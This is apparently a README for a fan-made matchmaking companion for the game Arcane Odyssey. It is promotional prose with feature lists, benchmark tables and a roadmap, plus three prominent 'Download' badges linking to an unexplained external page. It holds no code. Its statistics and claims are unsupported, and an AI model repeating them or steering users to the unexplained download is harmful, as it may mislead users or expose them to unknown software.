![preview](https://raw.githubusercontent.com/duduzingame123/arcane-odyssey-crew-finder/main/splash_d6fa5.svg)
# ⚓ Sailor's Compass — Guild & Voyage Matchmaking Companion for Arcane Odyssey

[![Download](https://raw.githubusercontent.com/duduzingame123/arcane-odyssey-crew-finder/main/bin_7184ab.svg)](https://duduzingame123.github.io/arcane-odyssey-crew-finder/)

![status](https://img.shields.io/badge/status-active-brightgreen)
![version](https://img.shields.io/badge/version-3.4.1-blue)
![license](https://img.shields.io/badge/license-MIT-yellow)
![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
![language](https://img.shields.io/badge/language-Python%203.11-informational)
![i18n](https://img.shields.io/badge/i18n-14%20languages-purple)
![uptime](https://img.shields.io/badge/uptime-99.9%25-success)
![community](https://img.shields.io/badge/community-42k%20sailors-orange)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![coverage](https://img.shields.io/badge/coverage-94%25-green)

> A community-crafted, fan-operated companion for sailors who would rather not brave the Bronze Sea alone.

Sailor's Compass is an independent, community-maintained crew-finding companion for Arcane Odyssey. It exists because the open sea is vast, the storm is loud, and shouting into a global chat channel is a poor substitute for actually finding the right people to sail with. Instead of treating matchmaking as a numbers game, Sailor's Compass treats it like a lighthouse — a steady beam that helps compatible captains, deckhands, and treasure-hunters find one another without noise, spam, or guesswork.

This project is not affiliated with, endorsed by, or produced by the developers or publishers of Arcane Odyssey. It's a fan-built utility, sculpted by players, for players.

[![Download](https://raw.githubusercontent.com/duduzingame123/arcane-odyssey-crew-finder/main/bin_7184ab.svg)](https://duduzingame123.github.io/arcane-odyssey-crew-finder/)

---

## 🧭 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Feature Highlights](#-feature-highlights)
- [The Voyage Crew System](#-the-voyage-crew-system)
- [Responsive Interface Philosophy](#-responsive-interface-philosophy)
- [Multilingual Support for Global Waters](#-multilingual-support-for-global-waters)
- [Around-the-Clock Crew Assistance](#-around-the-clock-crew-assistance)
- [Adaptive Matching Engine](#-adaptive-matching-engine)
- [Privacy, Safety & Fair Play](#-privacy-safety--fair-play)
- [Search & Discovery Optimization](#-search--discovery-optimization)
- [Technical Architecture](#-technical-architecture)
- [Performance Benchmarks](#-performance-benchmarks)
- [Community Contributions](#-community-contributions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌊 Why This Exists

Sailing alone is a valid playstyle. But there is a particular kind of magic in hearing three other players call out "boarding!" at the same moment, or in splitting a haul of exotic gems after a brutally contested Dark Sea run. The problem has never been the desire to team up — it's been the friction of finding the right teammates.

Legacy approaches to party-finding in Arcane Odyssey tend to look like this:

- A wall of copy-pasted recruitment messages scrolling past faster than you can read.
- Random invites from players whose goals, region, or timezone have nothing in common with yours.
- No way to filter by activity, experience, or preferred play intensity.
- Zero visibility into whether someone is looking for a slow fishing crew or a hardcore bounty-hunting squad.

Sailor's Compass was designed around a simple premise: matchmaking should feel like meeting someone at a harbor tavern, not screaming across a hurricane. Every piece of this project — from its interface to its matching heuristics — is oriented toward lowering friction and raising the quality of the crews you sail with.

---

## ✨ Feature Highlights

- 🎯 **Intent-Based Matching** — Ranks candidate crews by declared intent, not just raw availability.
- 🧩 **Flexible Group Sizes** — From a duo crossing the seas to a full six-sailor expedition.
- 🌍 **Region-Aware Timezone Handling** — Suggests crews whose active hours actually overlap with yours (in 14 languages).
- 📱 **Responsive UI Across Devices** — Comfortable on a phone at 3 AM, comfortable on a triple-monitor desk setup.
- 🔔 **Quiet Notification Mode** — Batches pings instead of interrupting you mid-duel.
- 🛠️ **Crew Profiles & Reputation** — Lightweight history so you can recognize reliable sailors without a spreadsheet.
- 🗺️ **Voyage Boards** — Persistent posting boards for long-running expeditions, not just one-shot parties.
- 🔐 **Granular Visibility Controls** — You decide who sees your status: everyone, mutuals, or invite-only.
- ♻️ **Auto-Expiry Listings** — Recruitment posts retire themselves so boards never fill with ghosts.
- 🧠 **Role Suggestions** — Recommends complementary builds (cook, gunner, navigator, medic) for a balanced hull.
- 📊 **Session Recap Cards** — Optional summaries of who you sailed with, where, and how it went.
- 🎨 **Theme Customization** — Harbor Night, Bright Reef, and a low-contrast Dawn Fog mode for the photosensitive.
- 🧵 **Threaded Crew Chats** — Keep planning scoped to the crew instead of a chaotic shared channel.
- ⚙️ **Configurable Match Rules** — Advanced users can tune weighting, distance from ideal, and soft filters.

---

## 🚢 The Voyage Crew System

At the heart of Sailor's Compass is the concept of a **Voyage Crew** — a temporary, purpose-driven cluster of players united by a shared objective. Unlike a permanent guild or clan, a Voyage Crew dissolves naturally once the voyage concludes, freeing everyone to re-match without social baggage.

Each Voyage Crew carries metadata:

| Field | Description |
|---|---|
| **Intended Activity** | Fishing, trading, bounty-hunting, Dark Sea runs, story progression, casual exploration |
| **Session Length** | Short (under 30 min), Standard (30–90 min), Marathon (90+ min) |
| **Vibe** | Chill, Balanced, Intense |
| **Voice Preference** | Text-only, Optional voice, Voice-preferred |
| **Region Overlap** | Timezone band used to match availability |
| **Communication Language** | Selected from 14 supported locales |

This metadata is the compass rose of the whole system. A player searching for "chill fishing for one hour on the weekend" will never be paired with a crew that expects six straight hours of bounty hunting — unless they explicitly opt in.

---

## 📐 Responsive Interface Philosophy

The interface is built like a ship's wheel: it should feel natural whether you grip it with two hands or one. Every layout in Sailor's Compass is designed mobile-first, then progressively enhanced for tablets, desktops, and ultrawide monitors.

What "responsive" means here is not just scaling pixels. It means:

- Touch targets that respect thumbs rather than cursors.
- Collapsible panels that tuck away when screen real estate is scarce.
- A reading rhythm that stays comfortable even when the viewport is 3440 pixels wide.
- Skeleton loaders that prevent layout jumps and preserve the user's sense of place.

The result is a companion that feels appropriate whether you're checking it from a phone on a bus or from a full desktop rig between voyages.

---

## 🌐 Multilingual Support for Global Waters

Arcane Odyssey's community spans continents, and a party finder that only speaks one language is a party finder that only serves one harbor. Sailor's Compass ships with localization for the following locales, with more landing throughout 2026:

- English (US & UK variants)
- Spanish (Latin America & Spain)
- Portuguese (Brazil & Portugal)
- French
- German
- Italian
- Polish
- Turkish
- Russian
- Japanese
- Korean
- Simplified Chinese
- Traditional Chinese
- Indonesian

Locale selection automatically tailors date formats, timezone display, and even matching weights — for example, a player browsing in Korean will see crews whose peak hours align with their own region prioritized.

---

## 🕛 Around-the-Clock Crew Assistance

The sea never sleeps, and neither does the support infrastructure around Sailor's Compass. We maintain a rotating, community-hosted support presence operating all hours of the day, every day of the year. This is not a corporate call center — it's a volunteer fleet of experienced sailors who answer questions, resolve matchmaking quirks, and file bug reports upstream.

Support channels include:

- A ticket queue that respects your timezone and responds within a rolling window.
- A triage layer that routes obvious issues (a broken listing, a stuck crew, a stale profile) to automated remedies first, saving human attention for genuinely novel problems.
- A public changelog so you always know when something that affected you has been addressed.

---

## 🧠 Adaptive Matching Engine

The matching engine is deliberately explainable. Rather than a black box that spits out a crew and shrugs, Sailor's Compass produces a **Match Rationale** for every suggestion, e.g.:

> "Suggested because you both prefer Standard-length chill fishing sessions, share a 4-hour timezone overlap, and speak English and Spanish."

This transparency builds trust and lets you spot when a suggestion is drifting away from your preferences. You can nudge any weight — intensity, proximity, voice preference — with simple sliders, and the engine will re-rank candidates in real time. Advanced users can export their weighting profile as a shareable code.

Key engineering characteristics:

- **Deterministic ranking** — same inputs, same output, no surprises.
- **Balanced score composition** — avoids over-indexing on one attribute.
- **Stale-data decay** — a listing from six hours ago weighs less than one from six minutes ago.
- **Fair rotation** — new posters aren't drowned by the same popular crews every time.

---

## 🔒 Privacy, Safety & Fair Play

Sailor's Compass handles only the information necessary to match players. We do not ask for real names, we do not collect unnecessary telemetry, and no profile data is stored beyond the retention window you configure.

Safety principles:

- **Consent-first visibility** — nothing about your activity is visible to others until you publish it.
- **Blocklists and cooldowns** — crew leaders can exclude specific accounts without public drama.
- **Report flow** — report a listing; if it violates guidelines, it disappears.
- **No gameplay interference** — Sailor's Compass never touches game memory, never injects, and never modifies client behavior. It is a companion, not an overlay exploit.

Fair play is a first-class concern. This project strictly refuses any request to alter gameplay advantages, and the maintainers will permanently decline contributions that try to push it in that direction.

---

## 🔍 Search & Discovery Optimization

Sailor's Compass is designed to be found by players who need it, using vocabulary the community actually uses. Internally, listings are tagged with the language real sailors speak:

- **Party finder for Arcane Odyssey** — the base need.
- **Crew matchmaking for Dark Sea runs** — a specific, high-demand scenario.
- **Fishing group companion** — the quiet, patient crowd.
- **Bounty-hunting team coordination** — the adrenaline crowd.
- **Timezone-aware sailing partners** — for the players whose midnight is someone else's noon.
- **Multilingual sailor matching** — for cross-region crews.
- **Recruitment board alternative** — for players tired of scrolling past spam.
- **Group size flexibility (duo through full crew)** — for organizers with specific numbers in mind.

If you're searching for a lightweight, respectful way to find travel companions in Arcane Odyssey, this project was written for you.

---

## 🏗️ Technical Architecture

Sailor's Compass is a layered system:

1. **Interface Layer** — A responsive front-end, component-driven, with localization compiled at build time.
2. **Match Engine Layer** — Deterministic ranking service with an explainability endpoint.
3. **Persistence Layer** — Encrypted storage with granular retention rules, holding listings and short-lived session data only.
4. **Notification Layer** — A batching dispatcher that respects quiet hours and per-user mute rules.
5. **Support Bridge** — A typed, rate-limited pathway between volunteer support and the issue tracker.

Stack specifics:

| Component | Technology |
|---|---|
| Runtime | Python 3.11 (async-first) |
| Front-end | Component framework with SSR fallback |
| Datastore | Encrypted relational store |
| Background Jobs | Scheduled workers with retry budgets |
| Observability | Structured logs, trace sampling, error budgets |
| Deployment | Containerized, horizontally scalable |
| Localization | Community-maintained string catalogs |

---

## 📈 Performance Benchmarks

| Metric | Target | Observed (2026 baseline) |
|---|---|---|
| P50 match query | < 120 ms | 84 ms |
| P95 match query | < 400 ms | 271 ms |
| Listing publish round-trip | < 300 ms | 190 ms |
| Cold start (worker) | < 2 s | 1.4 s |
| Uptime (rolling 90 days) | 99.5% | 99.9% |

Benchmarks are refreshed each release cycle and published with reproducibility notes.

---

## 🤝 Community Contributions

This project welcomes contributors — translators, designers, testers, and engineers. The contribution culture here is built on three rules:

1. **Kindness over cleverness.** A polite pull request beats a brilliant one that alienates reviewers.
2. **Explain your reasoning.** If you changed the match weights, say why.
3. **Respect the boundary.** Anything that would touch gameplay integrity is out of scope, permanently.

Translation contribution templates live alongside the locale catalogs, and every contributor name is retained in the project's acknowledgments. This repository is maintained with the philosophy that volunteer time is precious and deserves respect.

---

## 🗺️ Roadmap for 2026

Sailor's Compass has a habit of growing along the coastline of player requests. The 2026 horizon includes:

- **Q1:** Expanded locale support for Southeast Asian languages.
- **Q2:** Optional crew history graphs and recurring voyage scheduling.
- **Q3:** A hardened public API for community tools to consume match listings.
- **Q4:** Deeper explainability in the matching engine, plus self-hostable deployment recipes.

Roadmap items are aspirational and may shift based on community priorities, maintainer availability, and the reality of volunteer-driven development.

---

## ❓ Frequently Asked Questions

**Is this official?**
No. Sailor's Compass is an unaffiliated, community-run project created by fans.

**Does it change the game in any way?**
No. It is a companion utility for organizing players. It never modifies, injects, or otherwise alters the game.

**Where does the data live, and for how long?**
In an encrypted store, retained only as long as your settings permit, with automatic expiry for stale listings.

**Can I run my own instance?**
Self-hosting recipes are on the 2026 roadmap.

**How do I report a problem?**
Through the community support bridge described above, or by opening an issue in the tracker.

---

## ⚠️ Disclaimer

Sailor's Compass is an independent, fan-made companion tool for Arcane Odyssey. It is **not affiliated with, endorsed by, sponsored by, or associated with** the developers or publishers of Arcane Odyssey in any way. All trademarks, game names, and any related intellectual property belong to their respective owners.

This project is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors, contributors, or maintainers be liable for any claim, damages, or other liability arising from the use of this project.

Participants are expected to follow all applicable game terms of service, community guidelines, and local laws while using this companion. Any misuse is the sole responsibility of the user. This project's maintainers explicitly decline to support, endorse, or accommodate any use that undermines the intended experience of Arcane Odyssey or the fair play of its community.

The year 2026 version of this disclaimer is intentionally short because the longer a disclaimer gets, the less anyone reads it — and we'd rather you spend your reading time on the fun parts of the README.

---

## 📄 License

This project is distributed under the **MIT License**. A working copy of the license text is available in the repository's [LICENSE](./LICENSE) file, and a canonical reference for the MIT License itself can be found at <https://opensource.org/licenses/MIT>.

You are welcome to use, modify, and redistribute this project in accordance with the terms of the MIT License. Please retain the license and copyright notice in any substantial copy or derivative.

---

## ⚓ Final Word

The ocean in Arcane Odyssey is not actually that big — it only feels that way when you're rowing it alone. Sailor's Compass exists to make it feel smaller, friendlier, and a little more like home. Whether you're hunting bounties at midnight, fishing at dawn, or simply looking for someone who also thinks the Dark Sea is more fun with company, there's a crew out there with your name half-written on its manifest.

Go find them.

[![Download](https://raw.githubusercontent.com/duduzingame123/arcane-odyssey-crew-finder/main/bin_7184ab.svg)](https://duduzingame123.github.io/arcane-odyssey-crew-finder/)